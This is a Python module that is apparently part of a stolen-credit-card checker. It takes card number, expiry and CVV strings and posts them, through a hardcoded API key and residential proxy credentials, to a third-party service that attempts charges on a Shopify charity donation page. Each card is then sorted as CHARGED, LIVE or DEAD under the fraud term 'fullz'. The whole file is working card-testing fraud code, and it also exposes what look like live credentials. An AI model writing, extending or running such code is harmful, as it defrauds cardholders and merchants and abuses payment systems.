import httpx


async def shopify_charge_func(fullcc):
    try:
        cc, mes, ano, cvv = fullcc.strip().split("|")
        url = "https://api.voidapi.xyz/v2/shopify_graphql"

        payload = {
            "key": "VDX-SHA2X-NZ0RS-O7HAM",  
            "data": {
                "card": fullcc,
                "product_url": "https://justice-rescue.com/products/donate?variant=9749509439524",
                "email": None,
                "proxy": "proxy.ziny.io:1000:coopertimothy:OioZ6u9Z86O9ZVKzmBhy_country-us",
                "ship_address": None,
                "is_shippable": False
            }
        }

        async with httpx.AsyncClient(timeout=65) as client:
            res = await client.post(url, json=payload)
            return res.json()

    except Exception as e:
        return {"status": "error", "message": str(e)}

async def get_charge_resp(response, user_id, fullcc):
    try:
        status = response.get("status", "").lower()

        if status == "processedreceipt":
            return {
                "hits": "CHARGED",
                "fullz": fullcc,
                "response": response.get("message", "Charged Successfully")
            }
        elif status == "live":
            return {
                "hits": "LIVE",
                "fullz": fullcc,
                "response": response.get("message", "LIVE - Detected but not charged")
            }
        else:
            return {
                "hits": "DEAD",
                "fullz": fullcc,
                "response": response.get("message") or response.get("error", "Declined or Unknown Error")
            }

    except Exception as e:
        return {
            "hits": "DEAD",
            "fullz": fullcc,
            "response": f"Parser Exception: {str(e)}"
        }
